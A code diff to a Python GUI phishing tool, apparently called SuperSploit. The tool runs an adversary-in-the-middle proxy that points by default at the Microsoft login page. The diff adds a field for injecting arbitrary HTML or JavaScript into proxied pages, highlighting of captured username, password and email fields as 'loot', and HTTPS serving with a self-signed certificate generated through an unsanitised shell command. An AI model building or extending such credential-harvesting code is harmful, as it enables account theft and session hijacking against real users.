@@ -1,5 +1,5 @@
 import tkinter as tk
-from tkinter import ttk, messagebox, scrolledtext
+from tkinter import ttk, messagebox, scrolledtext, filedialog
 import os
 import re
 import threading
@@ -53,6 +53,7 @@ class WebTemplateGUI:
         self.placeholders = {}
         self.server_thread = None
         self.httpd = None
+        self.cert_path = tk.StringVar()
 
         self._build_ui()
         self._refresh_templates()
@@ -98,6 +99,10 @@ class WebTemplateGUI:
         self.target_url = tk.StringVar(value="https://login.microsoftonline.com")
         ttk.Label(self.aitm_label_frame, text="Target URL:").pack(side=tk.LEFT, padx=5)
         ttk.Entry(self.aitm_label_frame, textvariable=self.target_url, width=50).pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
+        
+        self.js_inject = tk.StringVar()
+        ttk.Label(self.aitm_label_frame, text="Inject HTML/JS:").pack(side=tk.LEFT, padx=5)
+        ttk.Entry(self.aitm_label_frame, textvariable=self.js_inject, width=30).pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
 
         # Variables & Preview
         paned = ttk.PanedWindow(self.tab_staging, orient=tk.HORIZONTAL)
@@ -122,8 +127,14 @@ class WebTemplateGUI:
         self.host_entry = ttk.Entry(server_frame, width=15); self.host_entry.insert(0, "0.0.0.0"); self.host_entry.grid(row=0, column=1)
         ttk.Label(server_frame, text="Port:").grid(row=0, column=2, padx=5)
         self.port_entry = ttk.Entry(server_frame, width=8); self.port_entry.insert(0, "8888"); self.port_entry.grid(row=0, column=3)
-        self.start_btn = ttk.Button(server_frame, text="🚀 START SERVER", command=self._toggle_server); self.start_btn.grid(row=0, column=4, padx=10)
-        self.status_label = ttk.Label(server_frame, text="Offline", foreground="red"); self.status_label.grid(row=0, column=5)
+        self.use_https = tk.BooleanVar(value=False)
+        ttk.Checkbutton(server_frame, text="HTTPS", variable=self.use_https).grid(row=0, column=4, padx=5)
+        self.start_btn = ttk.Button(server_frame, text="🚀 START SERVER", command=self._toggle_server); self.start_btn.grid(row=0, column=5, padx=10)
+        self.status_label = ttk.Label(server_frame, text="Offline", foreground="red"); self.status_label.grid(row=0, column=6)
+
+        ttk.Label(server_frame, text="Custom Cert (Optional):").grid(row=1, column=0, columnspan=2, padx=5, pady=5, sticky=tk.W)
+        ttk.Entry(server_frame, textvariable=self.cert_path, width=35).grid(row=1, column=2, columnspan=3, sticky=tk.W, pady=5)
+        ttk.Button(server_frame, text="Browse", command=self._browse_cert).grid(row=1, column=5, padx=5, pady=5)
 
         # --- TAB 2: CAPTURED LOOT ---
         self.tab_loot = ttk.Frame(self.main_tabs, padding="10")
@@ -137,6 +148,10 @@ class WebTemplateGUI:
 
         self.loot_display = scrolledtext.ScrolledText(self.tab_loot, bg="black", fg="#00FF00", font=("Courier", 10))
         self.loot_display.pack(fill=tk.BOTH, expand=True)
+
+    def _browse_cert(self):
+        f = filedialog.askopenfilename(filetypes=[("PEM/CRT Files", "*.pem *.crt"), ("All Files", "*.*")])
+        if f: self.cert_path.set(f)
 
     def _on_mode_change(self):
         if self.op_mode.get() == "Static":
@@ -243,6 +258,9 @@ class WebTemplateGUI:
                         self.end_headers()
                         content = resp.content.decode('utf-8', errors='ignore')
                         content = content.replace(target, f"http://{self.headers['Host']}")
+                        js_payload = outer_self.js_inject.get()
+                        if js_payload and "</body>" in content.lower():
+                            content = re.sub(r'</body>', f'{js_payload}</body>', content, flags=re.IGNORECASE)
                         self.wfile.write(content.encode())
                     except Exception as e: self.send_error(500, str(e))
             
@@ -251,7 +269,17 @@ class WebTemplateGUI:
                 post_data = self.rfile.read(content_length).decode('utf-8')
                 parsed_data = urllib.parse.parse_qs(post_data)
                 cleaned_data = {k: v[0] for k, v in parsed_data.items()}
-                outer_self._log_loot(self.client_address[0], cleaned_data)
+                
+                if mode == "AitM":
+                    loot = {}
+                    for k, v in cleaned_data.items():
+                        if any(x in k.lower() for x in ['user', 'pass', 'email', 'login', 'id']):
+                            loot[f"🔥 {k}"] = v
+                        else:
+                            loot[k] = v
+                    outer_self._log_loot(self.client_address[0], loot)
+                else:
+                    outer_self._log_loot(self.client_address[0], cleaned_data)
                 
                 if mode == "Static":
                     self.send_response(200); self.send_header("Content-type", "text/html"); self.end_headers()
@@ -269,6 +297,20 @@ class WebTemplateGUI:
 
         try:
             self.httpd = socketserver.TCPServer((host, port), StagedHandler)
+            if self.use_https.get():
+                import ssl
+                custom_cert = self.cert_path.get().strip()
+                if custom_cert and os.path.exists(custom_cert):
+                    cert_path = custom_cert
+                else:
+                    cert_path = os.path.join(os.getenv("HOME"), ".SuperSploit", ".data", "server.pem")
+                    if not os.path.exists(cert_path):
+                        os.system(f'openssl req -new -x509 -keyout {cert_path} -out {cert_path} -days 365 -nodes -subj "/C=US/ST=NY/L=NY/O=SuperSploit/CN={host}" 2>/dev/null')
+                
+                context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+                context.load_cert_chain(certfile=cert_path)
+                self.httpd.socket = context.wrap_socket(self.httpd.socket, server_side=True)
+                
             self.server_thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)
             self.server_thread.start()
             self.status_label.config(text="Online", foreground="green"); self.start_btn.config(text="🛑 STOP SERVER")
